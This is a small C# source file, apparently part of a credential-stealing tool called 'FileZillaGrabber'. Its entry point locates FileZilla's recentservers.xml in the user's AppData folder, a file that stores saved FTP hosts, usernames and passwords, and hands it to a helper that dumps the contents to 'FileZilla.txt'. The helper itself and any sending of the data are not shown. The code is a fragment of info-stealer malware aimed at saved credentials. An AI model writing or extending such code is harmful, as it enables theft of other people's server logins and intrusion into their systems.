namespace FileZillaGrabber
{
    using System;
    using System.IO;

    internal partial class Program
    {
        private static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");

        private static void Main() => 
            Go.GetDataFileZilla(FzPath, "FileZilla.txt");
    }
}